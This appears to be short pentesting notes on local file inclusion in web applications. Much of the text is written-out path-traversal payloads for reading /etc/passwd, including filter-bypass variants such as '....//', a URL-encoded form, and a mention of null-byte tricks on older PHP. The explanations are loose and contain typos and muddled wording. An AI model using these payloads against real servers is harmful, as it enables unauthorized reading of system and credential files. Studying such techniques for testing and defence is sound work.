LFI occurs when a parameter fetch a resource from server and we can instead make it fetch our requried files.
    Sometimes server includes a filname or directory in the get parameter so we can bypass it by pre appending a / and then traverse to required file as sometimes server requires it
NOtice how we preappended a / with etcpasswd location

    http://example.com/?id=/../../../../../etc/passwd

If server requires a specific keyword then we can add it first and then traverse to required location
Bypassing Blackilisting
    Sometimes server removes the ../ from our request and we cannot traverse direcotriees. To overcome this, we can simply either use .././ or ....// instead of a single ../. ,To demonstrate

?param=../../../../../etc/passwd would become

    ?param=....//....//....//....//....//etc/passwd

         OR

    ..//..//..//..//..//..//etc/passwd

    We can also bypass string blacklisting by rule encoding .This works in php 5.3.4< .

a ../ url encoded is %2e%2e%2f

so our previous double slash bypass can be encoded as

    %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

    We can also make use of null byte which is %00. php versions 5.5< \ is vulnerable to this and we can use it to like bypass the append .php extension or few different things.
